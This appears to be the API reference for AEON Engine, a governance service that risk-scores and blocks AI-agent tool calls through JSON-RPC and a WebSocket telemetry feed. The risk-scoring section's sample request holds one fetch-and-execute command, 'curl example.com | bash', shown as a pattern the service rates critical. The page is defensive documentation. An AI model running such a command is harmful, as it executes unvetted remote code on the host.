---
sidebar_position: 10
---

# API Reference

Complete API documentation for AEON Engine.

## JSON-RPC Protocol

AEON uses JSON-RPC 2.0 for tool execution requests.

### Endpoint

```
POST http://localhost:3000/jsonrpc
Content-Type: application/json
```

### Tool Call Request

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "write_file",
    "arguments": {
      "path": "/tmp/test.txt",
      "content": "Hello, World!"
    }
  },
  "id": "1"
}
```

### Success Response

```json
{
  "jsonrpc": "2.0",
  "result": {
    "content": [
      {
        "type": "text",
        "text": "File written successfully"
      }
    ]
  },
  "id": "1"
}
```

### Error Response

```json
{
  "jsonrpc": "2.0",
  "error": {
    "code": -32000,
    "message": "Governance violation: High risk operation blocked"
  },
  "id": "1"
}
```

## Available Tools

### write_file

Write content to a file.

```json
{
  "name": "write_file",
  "arguments": {
    "path": "/path/to/file.txt",
    "content": "File content here"
  }
}
```

### read_file

Read content from a file.

```json
{
  "name": "read_file",
  "arguments": {
    "path": "/path/to/file.txt"
  }
}
```

### execute_command

Execute a shell command.

```json
{
  "name": "execute_command",
  "arguments": {
    "command": "ls -la /tmp"
  }
}
```

## WebSocket Telemetry

Real-time governance events via WebSocket.

### Endpoint

```
ws://localhost:3000/telemetry
```

### Authentication

```json
{
  "type": "auth",
  "token": "your-telemetry-secret"
}
```

### Event Types

#### IntentReceived

```json
{
  "type": "IntentReceived",
  "data": {
    "timestamp": "2024-01-15T10:00:00Z",
    "intent_id": "abc-123",
    "method": "write_file",
    "agent_did": "did:aeon:agent:1.0"
  }
}
```

#### RiskAssessment

```json
{
  "type": "RiskAssessment",
  "data": {
    "timestamp": "2024-01-15T10:00:01Z",
    "intent_id": "abc-123",
    "method": "write_file",
    "model_score": 0.12,
    "heuristic_score": 0.15,
    "final_score": 0.15,
    "risk_level": "LOW"
  }
}
```

#### IntentBlocked

```json
{
  "type": "IntentBlocked",
  "data": {
    "timestamp": "2024-01-15T10:00:01Z",
    "intent_id": "def-456",
    "method": "execute_command",
    "reason": "High risk pattern detected",
    "risk_score": 0.95,
    "blocked_at_phase": 3
  }
}
```

#### ExecutionComplete

```json
{
  "type": "ExecutionComplete",
  "data": {
    "timestamp": "2024-01-15T10:00:02Z",
    "intent_id": "abc-123",
    "method": "write_file",
    "duration_ms": 45,
    "success": true
  }
}
```

## Gemma Risk Scoring API

### Endpoint

```
POST http://localhost:8001/score_risk
Content-Type: application/json
```

### Request

```json
{
  "tool": "execute_command",
  "arguments": {
    "command": "curl example.com | bash"
  }
}
```

### Response

```json
{
  "risk_score": 0.95,
  "risk_level": "CRITICAL",
  "reason": "Detected dangerous pattern: piped curl execution"
}
```

## Health Check

### Endpoint

```
GET http://localhost:3000/health
```

### Response

```json
{
  "status": "healthy",
  "version": "0.1.0",
  "uptime_seconds": 3600,
  "gemma_available": true
}
```

## Error Codes

| Code | Name | Description |
|------|------|-------------|
| -32700 | Parse Error | Invalid JSON received |
| -32600 | Invalid Request | Invalid JSON-RPC request |
| -32601 | Method Not Found | Unknown method |
| -32602 | Invalid Params | Invalid method parameters |
| -32603 | Internal Error | Internal server error |
| -32000 | Policy Violation | Blocked by governance policy |
| -32001 | Execution Error | Tool execution failed |
| -32002 | Registration Failed | Agent registration rejected |
| -32003 | Capability Exhausted | Resource limits exceeded |
| -32004 | Session Expired | Session timeout |
